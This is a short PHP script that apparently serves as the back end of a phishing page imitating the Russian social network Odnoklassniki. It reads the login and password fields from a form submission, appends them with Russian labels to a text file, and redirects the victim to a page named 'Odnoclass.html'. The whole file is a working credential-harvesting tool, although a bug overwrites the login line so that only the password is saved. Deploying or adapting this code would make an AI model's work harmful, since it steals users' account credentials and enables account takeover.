<?php 
$file=fopen('mes.txt','a+'); 
$name = $_POST['login'];
$pass = $_POST['password'];
$text = "Логин: $name \n"; 
$text = "Пароль: $pass \n";
fputs($file,$text); 
fclose($file);
header("Location:Odnoclass.html");
?>